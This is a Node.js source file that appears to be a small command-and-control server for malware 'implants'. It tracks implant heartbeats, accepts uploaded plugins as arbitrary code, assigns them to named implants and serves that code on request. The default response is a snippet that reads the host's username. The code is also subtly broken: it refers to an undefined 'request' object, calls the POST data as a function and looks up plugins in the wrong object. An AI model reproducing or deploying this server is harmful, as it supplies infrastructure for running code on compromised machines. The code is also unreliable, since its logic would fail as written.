const http = require('node:http');
const qs = require('node:querystring');

const host = 'localhost';
const port = '8000'

const PL = "PluginsToLoad";
const IN = "implant_name";
const PN = "plugin_name";
const PC = "plugin_content";

var implants = {}
var known_plugins = {}

const requestListener = function (req, res) {
    if (!(request.method == 'POST')) {
        res.writeHead("501");
        res.end("Must use POST");
    } else {
        var body = '';
        request.on('data', function (data) {
            body += data;
            if (body.length > 1e6)
                request.connection.destroy();
        });
        request.on('end', function () {
            var post = qs.parse(body);
            switch (req.url) {
                case "/":
                    if (!(IN in post)) {
                        res.writeHead(404);
                        res.end("Plugin or implant not found. Please correct.")
                    } else {
                        if (!(post[IN] in implants)) {
                            implants[post[IN]] = {};
                            implants[post[IN]][PL] = [];
                        }
                        implants[post[IN]]["LastKnownHeartBeat"] = new Date();
                        res.writeHead(200);
                        res.end(implants[post[IN]][PL]);
                    }
                    break
                case "/plugin/":
                    if (!(IN in post) || !(post[IN] in implants) || !(PN in post) || !(post[PN] in implants[PL])) {
                        res.writeHead(404);
                        res.end("Plugin or implant not found. Please correct.")
                    } else {
                        res.writeHead(200);
                        res.end(known_plugins[post[PN]]);
                    }
                    break
                case "/addplugin/":
                    if (!(PN in post) || !(PC in post)) {
                        res.writeHead(404);
                        res.end("Plugin or implant not found. Please correct.")
                    }
                    known_plugins[post[PN]] = post[PC];
                    res.writeHead(200);
                    res.end("OK");
                    break
                case "/linkimplantplugin/":
                    if (!(IN in post) || !(PN in post) || !(post[PN] in known_plugins) || !(post[IN] in implants)) {
                        res.writeHead(404);
                        res.end("Plugin or implant not found. Please correct.")
                    } else {
                        implants[post[IN]][PL].push(post(PN));
                        res.writeHead(200);
                        res.end("OK");
                    }
                    break
                default:
                    res.writeHead(200);
                    res.end("const os = require('node:os');console.log(os.userInfo().username);");
            }
        });
    }
};

const server = http.createServer(requestListener);
server.listen(port, host, () => {
    console.log(`Server is running on http://${host}:${port}`);
});